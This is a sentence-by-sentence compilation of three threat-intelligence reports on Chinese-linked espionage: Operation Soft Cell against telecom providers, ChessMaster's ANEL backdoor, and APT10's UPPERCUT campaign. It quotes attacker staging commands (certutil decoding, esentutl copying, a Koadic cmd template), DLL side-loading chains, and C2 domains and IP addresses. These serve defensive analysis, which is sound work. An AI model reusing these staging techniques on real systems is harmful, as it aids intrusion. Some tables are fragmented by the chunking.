Step 5: Mapping out the Infrastructure and Operational Activity

Reconstructing the Infrastructure
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: In order to make sense of all the data, we fed it into multiple threat intelligence sources, including our own and third parties.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: ⚠️ Note: Since we cannot share any IOCs, we will refer to file hashes, hostnames, IP addresses and other IOCs as generic placeholders.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: Hostname1 is the hostname that was used for the C2 server targeting the telecommunications providers.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: Hostname1 connected to multiple tools.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: In analyzing the files, it is clear they are all contacting the same host hostname1.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: hostname1 was the C2 server that the malware and web shells connected to.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: Once we determined the hashes in the scope of the attack were only connecting to hostname1, which is a dynamic DNS hostname, we looked to see if we could find more information about the C2 server.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: A simple WHOIS query revealed that the IP address was registered to a colocation hosting company in Asia, though there was no other publicly available information about this IP address.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: By querying all of our threat intel resources about this IP address, we discovered that it was associated with multiple dynamic DNS hostnames.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: Multiple dynamic DNS hostnames.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: We were unable to find indications of connections to Dynamic.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: DNS2 and Dynamic.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: DNS3.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: However, they were registered and associated with IP.Address1.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: For the other dynamic DNS hosts, we leveraged various threat intel repositories and crafted queries that searched for executables with these IP addresses and hostnames in their string table.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: One of the queries returned a few DLLs with identical names to the DLL we had initially investigated.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: However, the hashes were different.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: After obtaining the found DLLs, we patched them back into the NSIS installer and detonated the samples in our testing environment.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: Dynamic analysis of the newly obtained DLLs revealed a new set of domains and IP addresses that were completely different.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: These domains were actually related to different telecommunications providers.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: ⚠️ Note: Cybereason immediately reached out to those telecommunications providers and provided them all of the necessary information to handle the incident internally.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: Strings from the dumped memory section of the injected shellcode.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: We can see many details about the attack including domains and C2 server IP addresses.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: Shellcode being unpacked and injected into a remote process.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: The redacted segments contain the name of the customer, C2 IP addresses, and domains.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text:
Infrastructure Operational Security

The threat actor’s infrastructure.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: The threat actor had a specific pattern of behavior that allowed us to understand their modus operandi: they used one server with the same IP address for multiple operations.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: This server is a key component in their ‘non-attributable’ infrastructure.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: The threat actor separated operations by using different hostnames per operation, though they are hosted on the same server and IP address.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: The domains and server registration information pointed to three main countries: China, Hong Kong, and Taiwan.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: This is cheap and efficient for the threat actor, but is almost transparent for a seasoned researcher with access to the right threat intelligence tools.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: There are previous reports of threat actors including APT10 and APT1 using dynamic DNS.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: Monitoring this infrastructure gave us information about if and when the threat actor was starting new waves of the attack or additional attacks on other providers.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text:
When researching C2 servers, it is important to watch for:
Association with domains, especially if they are dynamic DNS domains.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: File hashes that are associated with the IP address or the domain of the C2 server.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: Static information and metadata from associated samples that could be used to broaden the search after additional information is gathered.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: This demonstrates the importance of proper operational security and a separation between tools and operations for threat actors.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text:
Step 6: Rounding Up Immediate/Potential Suspects
Attribution is a fickle and delicate art.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: In most cases, it is very difficult to achieve 100% certainty when attributing an attack to a specific threat actor.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: It can be tempting to attribute an attack to a certain threat actor whenever certain tools-of-the-trade, IP addresses, strings, or “indicative” techniques are observed.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: However, it is important to bear in mind that the aforementioned data points are often prone to manipulation and reuse across different threat actors.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: Further, they are not impervious to psychological warfare, as in, trying to “pin” an operation on a different threat actor to avoid proper attribution.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text:
In order to increase the certainty level when attributing to a specific threat actor, we took the following aspects of the attacks into consideration: 

Indicators of Compromise
TTPs (Tactics, Techniques and Procedures)
Threat actor's tools
Motive behind the attacks
Regional and industry considerations

Carefully examining each of the different aspects plays an important role in avoiding misattribution.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: This model offers a more balanced interpretation of the data that is based on a myriad of components.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: By performing a contextualized review of the data, you are able to yield a more wholesome result with greater certainty.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: When it comes to attributing Operation Soft Cell, we are unable to achieve 100% certainty with regard to the identity of the threat actor.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text:
However, based on our interpretation of the data, we conclude with a high level of certainty that:
The threat actor behind Operation Soft Cell is likely state-sponsored.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: The threat actor is affiliated with China.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: After following the above attribution model and carefully reviewing the data, we are able to narrow down the suspect list to three known APT groups, all of which are known to be linked to China- APT10, APT27, and DragonOK.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: Having found multiple similarities to previous attacks, it is our estimation that the threat actor behind these attacks is likely linked to APT10, or at the very least, to a threat actor that shares tools, techniques, motive and infrastructural preferences with those of APT10.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: While we cannot completely rule out a “copy-cat” scenario, where another threat actor might masquerade as APT10 to thwart attribution efforts, we find this option to be less likely in light of our analysis of the data.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text:
Conclusion
In this blog, we have described an ongoing global attack against telecommunications providers that has been active since at least 2017.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: The threat actor managed to infiltrate into the deepest segments of the providers’ network, including some isolated from the internet, as well as compromise critical assets.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: Our investigation showed that these attacks were targeted, and that the threat actor sought to steal communications data of specific individuals in various countries.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: Throughout this investigation, we have uncovered the infrastructure that facilitated the malicious operations taken by this threat actor.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: The data exfiltrated by this threat actor, in conjunction with the TTPs and tools used, allowed us to determine with a very high probability that the threat actor behind these malicious operations is backed by a nation state, and is affiliated with China.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: Our contextualized interpretation of the data suggests that the threat actor is likely APT10, or at the very least, a threat actor that shares, or wishes to emulate its methods by using the same tools, techniques, and motives.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: It’s important to keep in mind that even though the attacks targeted specific individuals, any entity that possesses the power to take over the networks of telecommunications providers can potentially leverage its unlawful access and control of the network to shut down or disrupt an entire cellular network as part of a larger cyber warfare operation.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: Due to multiple and various limitations, we cannot disclose all the information we have gathered on the attack in this report.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: Our team will continue to monitor and track the threat actor’s activity in order to identify more tools and compromised organizations.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: Watch the Operation Soft Cell Webinar On-Demand.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: Closing Notes: This research, which is still ongoing, has been a huge effort for the entire Cybereason Nocturnus team.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: Special thanks goes to Niv Yona, Noa Pinkas, Josh Trombley, Jakes Jansen, and every single member of the Nocturnus team for the countless hours and effort that were put into this research.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

text: We will continue to monitor and update our blog with more information once available and as our investigation progresses.
source: Operation Soft Cell_ A Worldwide Campaign Against Telecommunications Providers.html

ChessMaster Adds Updated Tools to Its Arsenal
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: In this blog post, we analyze ChessMaster's current status, including the updated tools in its arsenal — with a particular focus on the evolution of ANEL and how it is used in the campaign.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text:
By: Tamada Kiyotaka, MingYen Hsieh
		
			March 29, 2018
Read time: 7 min (1963 words)
	















Save to Folio






 Subscribe












Trend Micro discovered the ChessMaster campaign back in July 2017 as part of our monitoring efforts to protect our customers.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: At the time, we found ChessMaster targeting different sectors from the academe to media and government agencies in Japan.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: The threat group used a variety of attack tools and techniques to spy on their target organizations.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: Back then, we noted that ChessMaster's sophisticated nature implied that the campaign could evolve, before finding changes in the tools and tactics used in the campaign a few months later.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: While the original campaign was comprehensive and used remote access Trojans (RATs) such as ChChes and RedLeaves, this new campaign used a new backdoor (Detected by Trend Micro as BKDR_ANEL.ZKEI) that leverages the CVE-2017-8759 vulnerability for its cyberespionage activities.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: In this blog post, we analyze ChessMaster's current status, including the updated tools in its arsenal — with a particular focus on the evolution of ANEL and how it is used in the campaign.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text:
July ChessMaster Campaign
November ChessMaster Campaign
Current ChessMaster Campaign 
Point of Entry

Spear-phishing emails containing decoy documents
Malicious shortcut (LNK) files and PowerShell
Self-extracting archive (SFX)
source: ChessMaster Adds Updated Tools to Its Arsenal.html

Technical Analysis

Figure 1.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text:
Infection Chain for the current ChessMaster campaign
ChessMaster’s current iteration starts off with the familiar phishing attacks seen in the earlier campaigns that involved the use of an email with an attached malicious document using the doc, docx, rtf, csv and msg formats.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text:
The email title and attached file name were written in Japanese and contain general business, political, and economy-themed phrases such as

世界経済(World economy)
経済政策(economic policy)
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text:
予算概算要求(budget estimation request)
日米対話(Japan-US dialogue)
安倍再任(re-appointment of Prime Minister Abe)
連絡網(contact network)
職員採用案(staff recruitment plan)
会議(meeting)
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: However, there is a change in the exploit document.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: When we tracked ChessMaster back in November, we noted that it exploited the SOAP WSDL parser vulnerability CVE-2017-8759 (patched in September 2017) within the Microsoft .NET framework to download additional malware.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text:
While ChessMaster still uses the previous exploit, it also added more methods to its arsenal: one exploits another vulnerability, CVE-2017-11882 (patched in November 2017), which was also exploited to deliver illegal versions of the Loki infostealer.

Figure 2.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text:
Exploitation of CVE-2017-11882
It also abuses three legitimate MS Office functions:

Function
Purpose
Affected MS Office Formats we found in the wild
Automatic Dynamic Data Exchange (DDEAUTO)
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text:
A legitimate Microsoft Office function used in an Office file to retrieve data from another Office file  

.doc
.rtf
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text:
.msg


Link Auto Update
An Office function used for automatic and user-free updates for embedded links upon opening.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text:
.csv


Microsoft Word's "Frames/Frameset"
A feature that allows HTML or Text pages to be loaded in a frame within Microsoft Word.

.docx





Figure 3.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text:
Exploitation of DDEAUTO

Figure 4.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text:
Abusing Microsoft Word's "Frames/Frameset"

Figure 5.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text:
Exploitation of Link Auto Update
ChessMaster can utilize any of these methods to download the next malware in the chain, the open source post-exploitation tool known as “Koadic,” which the previous campaign also used.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: This tool is responsible for stealing information — specifically the environment information — within the target system.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text:
Koadic executes the following command:

%comspec%
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: /q
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: /c
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text:
<cmd> 1> <Output> 2>&1

The commands and output of Koadic will change according to the ANEL version used in the attack.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: The table below lists examples of the commands and outputs for ANEL versions 5.1.1 rc and 5.1.2 rc1.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: Note that if ANEL 5.1.2 rc1 was downloaded, the attacker would use HTTPS to avoid the downloaded data being captured as clear text.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: Figure 8.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: Command added when the Koadic RAT is downloaded (use of {Variable}.shell.exec command)
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: If Koadic finds that the system is conducive to the attacker’s interests, it downloads a base64-encrypted version of the ANEL malware from the Command-and-Control (C&C) server and executes it.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: Encrypted ANEL is decrypted using the “certutil -docode” command.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: When ANEL executes, a decrypted DLL file with the filename “lena_http_dll.dll” is expanded in memory.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text:
This file contains one export function — either “crt_main” or “lena_main”

Figure 9.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text:
Base64 encoded ANEL downloaded by Koadic
ANEL will send the infected environment’s information to the C&C server.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: When sending the information, ANEL encrypts the data using blowfish, XOR, and Base64-based encryption methods.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: The format ANEL uses to send data is similar to ChChes, but ANEL's encryption method is easier to use.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: Figure 10.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: Encryption key using blowfish
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: We initially discovered the malware known as ANEL back in September 2017.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: At that time, ChessMaster was using ANEL as a backdoor into the target system then injects code into svchost.exe, which then decrypts and activates the embedded backdoor.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: This initial version of ANEL had a hardcoded version labeled “5.0.0 beta1” that contained incomplete code.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: We noted that this might signify the release of a future variant.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text:
Instead of just one new variant, we discovered four different versions of ANEL:

5.0.0 beta1
5.1.1 rc
5.1.2 rc1
5.2.0 rev1

The different versions contain changes in the ANEL loader and the main ANEL DLL.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text:
The figure below shows a summary of the changes between each version:

Figure 11.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text:
Summary of the changes between each version of ANEL
Differences with regards to Backdoor commands:

CMD ID
5.0.0 beta1/5.1.1 rc/5.1.2 rc1
5.2.0 rev1
0x97A168D9697D40DD
Save File
0x7CF812296CCC68D5
Upload File
0x652CB1CEFF1C0A00
NA
Load New PE file
0x27595F1F74B55278
Save File and Execute
If no match above
Execute Command or File


The differences shown in the table above are subtle but present.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: For example, the initial ANEL version, “5.0.0 beta1,” uses a different C&C server compared to the other versions.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: Once ANEL evolved to “5.1.1 rc,” it changed its file type to an executable, while also changing the C&C server.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: The third version we found (5.1.2 rc1) reverts to a DLL file type but retains the C&C server.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: The fourth version of ANEL (5.2.0 rev1) changes both the export function in the expanded main ANEL DLL and uses a different C&C server.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text:
Overall, we can see subtle changes, which indicate that the threat actors behind ANEL are making incremental improvements to the malware to refine it.

Figure 12.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: Backdoor function differences between ANEL 5.0.0 beta1/5.1.1 rc/5.1.2 rc1 (left) and ANEL 5.2.0 rev1 (right)
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: Once ANEL enters the user’s system, it will download various tools that could be used for malicious purposes, including password retrieval tools as well as malicious mail services and accessibility tools that will allow it to gather information about the system.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: These include Getpass.exe and Mail.exe, which are password and information stealers.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text:
It also downloads the following:

Accevent.exe <->
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text:
Microsoft Accessible Event Watcher 7.2.0.0
event.dll <-> the loader of ssssss.ddd, (Detected as TROJ_ANELLDR)
ssssss.ddd (lena_http.bin) <-> encrypted BKDR_ANEL
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text:
(Detected as BKDR_ANELENC)

These three files work together using a common technique call DLL Side-Loading or DLL Hijacking.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: In this scenario, accevent.exe is the primary executable, which is usually legitimate.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: After the execution of accevent.exe, it loads event.dll, which will be placed in the same folder (so it takes loading priority), after which event.dll decrypts and loads the encrypted backdoor ssssss.ddd, which is BKDR_ANEL.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text:
When we analyzed ANEL 5.1.1 rc, encrypted ANEL 5.1.2 rc1 was downloaded and executed.
Short-term mitigation
When the user opens the document DDEAUTO or Link Auto Update, Office will display a message.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: If the user clicks on the “No” button, malicious activity will not initiate.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text:
Figure 13: Popup message when users open the document that abuses DDEAUTO

Figure 14.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text:
Popup message when the user opens the document that abuses Link Auto Update
Koadic sends its own JavaScript code as plain text.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: The suspect communication allows us to detect the traffic.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: Figure 15.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text:
Koadic’s communication traffic
Medium- to long-term mitigation
At first glance, it seems ChessMaster’s evolution over the past few months involves subtle changes.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: However, the constant addition and changing of features and attack vectors indicate that the attackers behind the campaign are unlikely to stop and are constantly looking to evolve their tools and tactics.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: Organizations can implement various techniques and best practices to defend against targeted attacks, such as regular patching to prevent vulnerability exploitation and using tools that provide protection across different network levels.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: Solutions that feature behavior monitoring, application control, email gateway monitoring, and intrusion/detection systems can help with this.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: Given how cybercriminal tools, tactics and procedures are evolving, organizations will have to go beyond their typical day-to-day security requirements and find a way to preempt attacks.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: Thus, there is a pressing need to detect and address threats via a proactive incident response strategy.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: Essentially, this involves creating a remediation plan for effectively combating the threat and using round-the-clock intrusion detection and threat analysis to prevent attacks from entering the system.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: A proactive strategy can be much more effective for targeted attacks, as these kinds of attacks are often designed to be elusive and difficult to detect, thus the need to scope them out.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: A comprehensive security strategy that involves proactive incident response will need the input of both decision makers and tech-savvy personnel, as they will need to be on the same page for it to be effective.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: In addition to implementing both mitigation techniques and proactive strategies, organizations can also strengthen their security by employing solutions such Trend Micro™ Deep Security™ and TippingPoint, which protects endpoints from threats that abuse vulnerabilities.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: In addition, comprehensive security solutions can be used to protect organizations from attacks.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: These include Trend Micro endpoint solutions such as Trend Micro™ Smart Protection Suites and Worry-Free™ Business Security, which can protect users and businesses from these threats by detecting malicious files, well as blocking all related malicious URLs.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: Trend Micro Deep Discovery™ can protect enterprises by detecting malicious attachment and URLs.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: Trend Micro OfficeScan™ with XGen™ endpoint security infuses high-fidelity machine learning with other detection technologies and global threat intelligence for comprehensive protection against all kinds of threats.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

text: A more detailed analysis of the Command-and-Control communication flow of ANEL can be found in this technical brief.
source: ChessMaster Adds Updated Tools to Its Arsenal.html

source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: Last updated: Aug 10, 2023 Advanced Persistent Threats (APTs)TTPsThreat ResearchMalwareIntroductionIn July 2018, FireEye devices detected and blocked what appears to be APT10 (Menupass) activity targeting the Japanese media sector.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: APT10 is a Chinese cyber espionage group that FireEye has tracked since 2009, and they have a history of targeting Japanese entities.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: In this campaign, the group sent spear phishing emails containing malicious documents that led to the installation of the UPPERCUT backdoor.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: This backdoor is well-known in the security community as ANEL, and it used to come in beta or RC (release candidate) until recently.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: Part of this blog post will discuss the updates and differences we have observed across multiple versions of this backdoor.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: Attack OverviewThe attack starts with Microsoft Word documents containing a malicious VBA macro being attached to spear phishing emails.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: Although the contents of the malicious documents are unreadable (see Figure 3), the Japanese titles are related to maritime, diplomatic, and North Korean issues.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: Table 1 shows the UPPERCUT indicators of compromise (IoCs).File NameMD5SizeC2自民党海洋総合戦略小委員会が政府に提言申し入れ.docGovernment Recommendations from the Liberal Democratic Party’s Comprehensive Strategic Maritime Subcommittee4f83c01e8f7507d23c67ab085bf79e97843022eservake.jetos[.]com82.221.100.52151.106.53.147グテマラ大使講演会案内状.docInvitation to Lecture by Guatemalan Ambassadorf188936d2c8423cf064d6b8160769f21720384 eservake.jetos[.]com151.106.53.147153.92.210.208 米国接近に揺れる北朝鮮内部.docNorth Korean interior swayed by the approach of the United Statescca227f70a64e1e7fcf5bccdc6cc25dd733184eservake.jetos[.]com153.92.210.208167.99.121.203Table 1: UPPERCUT IoCsFor the North Korean lure, a news article with an identical title was readily available online.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: It’s also worth noting that in the Guatemalan lure, the attacker used an unusual spelling of Guatemala in Japanese.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: The top result of a Google search using the same spelling led us to the event website for the lecture of the Guatemalan Ambassador, held in August 2018.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: Figure 1 shows the screenshot of the event page.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: Figure 1: Event Website for the Lecture of Guatemala AmbassadorFigure 2 shows the macro function that displays the lure document.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: At the bottom of this function, we can see the readable text that matches the contact information found in Figure 1.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: Thus, people who would have an interest in Latin American issues may have been the targets of this campaign.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: Figure 2: Macro to display lure documentThe initial Word documents were password protected, likely in an effort to bypass detection.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: Once the password (delivered in the body of the email) is entered, the users are presented with a document that will request users to enable the malicious macro, as shown in Figure 3.Figure 3: Lure documentFigure 4 shows what happens when the malicious macro is executed.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: Figure 4: Macro to install UPPERCUTThe execution workflow is as follows:1.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: The macro drops three PEM files, padre1.txt, padre2.txt, and padre3.txt, to the victim’s %TEMP% folder and then copies them from %TEMP% to the %AllUserProfile% folder.2.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: The macro decodes the dropped files using Windows certutil.exe with the following commands (certutil.exe is a legitimate built-in command-line program to manage certificates in Windows):C:\Windows\System32\cmd.exe" /c
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: certutil -decode C:\ProgramData\padre1.txt C:\ProgramData\\GUP.txtC:\Windows\System32\cmd.exe" /c certutil -decode C:\ProgramData\padre2.txt C:\ProgramData\\libcurl.txtC:\Windows\System32\cmd.exe" /c certutil -decode
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: C:\ProgramData\padre3.txt C:\ProgramData\\3F2E3AB93.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: The macro creates a copy of the files with their proper extensions using Extensible Storage Engine Utilities (esentutil.exe) with the following commands (esentutil.exe is also a legitimate program that is pre-installed in Windows):C:\Windows\System32\esentutl.exe" /y
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: C:\ProgramData\\GUP.txt /d
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: C:\ProgramData\GUP.exe /oC:\Windows\System32\esentutl.exe"
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: /y C:\ProgramData\\libcurl.txt /d C:\ProgramData\libcurl.dll /oThe dropped files include the following:GUP.exe : GUP, a free (LGPL) Generic Updater.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: GUP is an open source binary used by Notepad++ for software updates.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: The version used here is version 4.1 digitally signed by Notepad++, as shown in Figure 5.libcurl.dll: Malicious Loader DLL3F2E3AB9: Encrypted shellcodeFigure 5: Notepad++ signed updater4.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: The macro launches the legitimate executable GUP.exe.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: The executable sideloads the malicious DLL (libcurl.dll), which decrypts and runs shellcode (3F2E3AB9) located in the same folder.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: The shellcode decodes and decompresses another DLL, which is an updated variant of UPPERCUT.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: Before decoding the DLL, the shellcode uses an anti-debug technique based on ntdll_NtSetInformationThread which causes the thread to be detached from the debugger, as shown in Figure 6.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: The DLL is then loaded into memory and the randomly named exported function is called.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: Figure 6: Anti-debug technique used by shellcode5.
source: APT10 Targets Japanese Corporations _ UPPERCUT backdoor.html

text: The macro deletes the initially dropped .txt files using Windows esentutl.exe and changes the document text to an embedded message.
